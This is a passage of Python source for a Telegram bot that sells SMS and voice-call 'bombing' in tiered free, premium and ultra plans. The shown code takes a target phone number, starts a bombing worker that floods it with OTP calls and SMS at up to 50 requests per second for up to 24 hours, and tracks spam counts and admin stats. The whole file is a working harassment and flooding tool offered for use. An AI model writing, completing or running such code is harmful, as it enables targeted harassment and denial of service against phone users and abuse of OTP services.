        await update.message.reply_text("⚠️ Your plan has expired. You've been downgraded to Free plan.")
        user_data = db.get_user(chat_id)
    
    # Get speed info
    plan = user_data['plan']
    if plan == "free":
        speed = FREE_SPEED
        duration_text = "1 minute"
    elif plan == "premium":
        speed = PREMIUM_SPEED
        duration_text = "4 hours"
    elif plan == "ultra":
        speed = ULTRA_SPEED
        duration_text = "24 hours"
    else:
        speed = FREE_SPEED
        duration_text = "1 minute"
    
    # Ask for phone number
    await update.message.reply_text(
        f"📱 Enter Target Phone Number\n\n"
        f"Please reply with the target phone number:\n"
        f"911234567890 (India: 91 + 10-digit number)\n\n"
        f"Format: CountryCode + Number (without +)\n"
        f"⚡ Ultra-Fast Mode:\n"
        f"• Plan: {plan.upper()}\n"
        f"• Duration: {duration_text}\n"
        f"• Speed: {speed} requests/second\n"
        f"• Voice OTP calls will be sent first\n\n"
        f"👨‍💻 Developer: {BOT_DEVELOPER}"
    )
    
    # Set user state
    user_states[chat_id] = {'waiting_for_number': True}

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle user messages"""
    chat_id = update.effective_chat.id
    user = update.effective_user
    message_text = update.message.text.strip()
    
    # Check if user is waiting for phone number
    if chat_id in user_states and user_states[chat_id].get('waiting_for_number'):
        # Validate phone number
        if not message_text.isdigit() or len(message_text) < 10:
            await update.message.reply_text("❌ Invalid phone number. Please enter digits only (e.g., 911234567890).")
            return
        
        # Extract country code (first 2 digits)
        country_code = message_text[:2]
        target_number = message_text[2:]  # Remove country code for API
        
        # Check if we have APIs for this country
        if country_code not in APIS['call'] and country_code not in APIS['sms']:
            await update.message.reply_text(f"❌ Country code {country_code} not supported. Currently only 91 (India) is supported.")
            user_states[chat_id]['waiting_for_number'] = False
            return
        
        # Get user data
        user_data = db.get_user(chat_id)
        if not user_data:
            await update.message.reply_text("❌ User not found. Please /start again.")
            user_states[chat_id]['waiting_for_number'] = False
            return
        
        plan = user_data['plan']
        duration = db.get_bombing_duration(plan)
        
        # Get speed info
        if plan == "free":
            speed = FREE_SPEED
        elif plan == "premium":
            speed = PREMIUM_SPEED
        elif plan == "ultra":
            speed = ULTRA_SPEED
        else:
            speed = FREE_SPEED
        
        # Create bombing session
        session_id = db.create_bombing_session(chat_id, message_text, plan)
        
        # Count APIs
        call_count = len(APIS['call'].get(country_code, []))
        sms_count = len(APIS['sms'].get(country_code, []))
        
        # Send initial message
        initial_message = f"""
🚀 ULTRA-FAST Bombing Started

📱 Target: {message_text}
📞 Call APIs: {call_count} (Sending FIRST)
💬 SMS APIs: {sms_count}
🔥 Max Speed: {speed} requests/second
🔄 Status: 🟢 Starting Voice OTP calls...
⏱ Duration: {duration//60} minutes
📊 Requests: 0
✅ Success Rate: 0%

⚠️ Voice OTP calls will be sent FIRST!
👨‍💻 Developer: {BOT_DEVELOPER}
"""
        
        await update.message.reply_text(initial_message)
        
        # Clear user state
        user_states[chat_id]['waiting_for_number'] = False
        
        # Prepare user info for logging
        user_info = {
            'id': user.id,
            'username': user.username,
            'first_name': user.first_name
        }
        
        # Start bombing worker
        asyncio.create_task(
            bombing_worker(session_id, target_number, country_code, duration, context, chat_id, plan, user_info)
        )
        return
    
    # If not waiting for number, show help
    await update.message.reply_text("Type /start to begin or /help for commands.")

async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /plan command"""
    chat_id = update.effective_chat.id
    user = update.effective_user
    
    # Log action
    await log_action(
        context, 
        user.id, 
        user.username, 
        user.first_name,
        "/plan command"
    )
    
    user_data = db.get_user(chat_id)
    
    if not user_data:
        await update.message.reply_text("❌ User not found. Please /start first.")
        return
    
    plan = user_data['plan']
    expiry = user_data['plan_expiry']
    bomb_count = user_data['bomb_count']
    total_spam = user_data['total_spam']
    expiry_text = await format_plan_expiry(expiry)
    
    # Get plan details
    if plan == "free":
        duration = "1 minute"
        speed = "20 reqs/sec"
        price = "Free"
        features = ["1 min bombing", "Voice OTP + SMS", "20 reqs/sec", "30 days expiry"]
    elif plan == "premium":
        duration = "4 hours"
        speed = "35 reqs/sec"
        price = "Contact Admin"
        features = ["4 hour bombing", "Voice OTP priority", "35 reqs/sec", "30 days expiry"]
    elif plan == "ultra":
        duration = "24 hours"
        speed = "50 reqs/sec"
        price = "Contact Admin"
        features = ["24 hour bombing", "Voice OTP first", "50 reqs/sec", "VIP support", "30 days expiry"]
    else:
        duration = "1 minute"
        speed = "20 reqs/sec"
        price = "Free"
        features = ["1 min bombing", "Basic features", "30 days expiry"]
    
    plan_text = f"""
📊 Your Plan Details

Current Plan: {plan.upper()}
Bombing Duration: {duration}
Max Speed: {speed}
Plan Expires: {expiry_text}
Total Bombs: {bomb_count}
Total Spam Sent: {total_spam:,}

⚡ Bot Features:
"""
    for feature in features:
        plan_text += f"• {feature}\n"
    
    plan_text += f"\nPrice: {price}"
    plan_text += f"\n\n👨‍💻 Developer: {BOT_DEVELOPER}"
    
    await update.message.reply_text(plan_text)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stats command"""
    chat_id = update.effective_chat.id
    user = update.effective_user
    
    # Log action
    await log_action(
        context, 
        user.id, 
        user.username, 
        user.first_name,
        "/stats command"
    )
    
    user_data = db.get_user(chat_id)
    
    if not user_data:
        await update.message.reply_text("❌ User not found. Please /start first.")
        return
    
    expiry_text = await format_plan_expiry(user_data['plan_expiry'])
    
    stats_text = f"""
📈 Your Statistics

Account:
• Plan: {user_data['plan'].upper()}
• Expires: {expiry_text}
• Joined: {user_data['created_at'][:10]}

Bombing Stats:
• Total Bomb Sessions: {user_data['bomb_count']}
• Total Spam Sent: {user_data['total_spam']:,}
• Last Bomb: {user_data['last_bomb_time'][:19] if user_data['last_bomb_time'] else 'Never'}

⚡ Bot Features:
• Voice OTP + SMS bombing
• Free: 20 reqs/sec (1 minute)
• Premium: 35 reqs/sec (4 hours)
• Ultra: 50 reqs/sec (24 hours)
• All plans: 30 days expiry

👨‍💻 Developer: {BOT_DEVELOPER}
"""
    
    await update.message.reply_text(stats_text)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    user = update.effective_user
    
    # Log action
    await log_action(
        context, 
        user.id, 
        user.username, 
        user.first_name,
        "/help command"
    )
    
    help_text = f"""
🆘 Help & Instructions

How to use:
1. Type /bomb to start
2. Enter target phone number (e.g., 911234567890)
3. Voice OTP calls will be sent FIRST
4. Then SMS bombing starts automatically

Commands:
/start - Start the bot
/bomb - Start bombing session
/plan - View your current plan
/stats - View your statistics
/help - Show this help message

⚡ ULTRA-FAST Features:
• Voice OTP calls first
• Free: 20 reqs/sec (1 minute)
• Premium: 35 reqs/sec (4 hours)
• Ultra: 50 reqs/sec (24 hours)
• 30 days plan expiry

Plans (30 days expiry):
• Free: 1 minute per session (20 reqs/sec)
• Premium: 4 hours per session (35 reqs/sec)  
• Ultra: 24 hours per session (50 reqs/sec)

Important:
• All plans expire after 30 days
• Use responsibly
• Don't bomb emergency numbers
• The bot owner is not responsible for misuse

👨‍💻 Developer: {BOT_DEVELOPER}

Support:
Contact admin for upgrades or help
"""
    await update.message.reply_text(help_text)

# ==================== ADMIN COMMANDS ====================
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /admin command"""
    chat_id = update.effective_chat.id
    user = update.effective_user
    
    if chat_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use admin commands.")
        return
    
    # Log action
    await log_action(
        context, 
        user.id, 
        user.username, 
        user.first_name,
        "/admin command"
    )
    
    # Get admin stats
    stats = db.get_user_stats()
    total_apis = len(APIS['call']['91']) + len(APIS['sms']['91'])
    
    # Calculate success rate safely
    success_rate = 0
    if stats['total_requests'] > 0:
        success_rate = (stats['total_success'] / stats['total_requests']) * 100
    
    admin_text = f"""
🛠 Admin Panel

Users:
• Total: {stats['total_users']}
• Active: {stats['active_users']}
• Banned: {stats['banned_users']}
• Expired Plans: {stats['expired_users']}

Plans:
• Free: {stats['plan_stats'].get('free', 0)}
• Premium: {stats['plan_stats'].get('premium', 0)}
• Ultra: {stats['plan_stats'].get('ultra', 0)}

Spam Stats:
• Total Spam: {stats['total_spam']:,}
• Total Requests: {stats['total_requests']:,}
• Success Rate: {success_rate:.1f}%

APIs (Only visible to admins):
• Call APIs: {len(APIS['call']['91'])} (SENT FIRST)
• SMS APIs: {len(APIS['sms']['91'])}
• Total: {total_apis}

Speed Settings:
• Free: {FREE_SPEED} reqs/sec
• Premium: {PREMIUM_SPEED} reqs/sec  
• Ultra: {ULTRA_SPEED} reqs/sec

Active Sessions: {len(active_sessions)}

👨‍💻 Developer: {BOT_DEVELOPER}
"""
    
    await update.message.reply_text(admin_text)

# ==================== MAIN FUNCTION ====================
def main():
    """Start the bot"""
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("bomb", bomb_command))
    application.add_handler(CommandHandler("plan", plan_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("admin", admin_command))
    
    # Add message handler
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Count APIs
    total_apis = len(APIS['call']['91']) + len(APIS['sms']['91'])
    
    # Start the bot
    print("=" * 60)
    print("🤖 ULTRA-FAST SMS & Call Bombing Bot")
    print("=" * 60)
    print(f"✅ Bot Token: Loaded successfully")
    print(f"📊 Database: Initialized")
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"📝 Logging to chat: {LOGGING_CHAT_ID}")
    print(f"📡 Total APIs: {total_apis}")
    print(f"   • Call APIs: {len(APIS['call']['91'])} (SENT FIRST)")
    print(f"   • SMS APIs: {len(APIS['sms']['91'])}")
    print(f"⚡ Speed Configuration:")
    print(f"   • Free: {FREE_SPEED} reqs/sec (1 minute)")
    print(f"   • Premium: {PREMIUM_SPEED} reqs/sec (4 hours)")
    print(f"   • Ultra: {ULTRA_SPEED} reqs/sec (24 hours)")
    print(f"⏰ All plans expire in: 30 days")
    print(f"📋 User Action Logging: ENABLED")
    print(f"👨‍💻 Developer: {BOT_DEVELOPER}")
    print(f"📱 Version: {BOT_VERSION}")
    print("=" * 60)
    print("🚀 Bot is starting in ULTRA-FAST mode...")
    print("✅ Bot is ready to use!")
    
    try:
        application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    except Exception as e:
        logger.error(f"Failed to start bot: {e}")
        print(f"❌ Error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()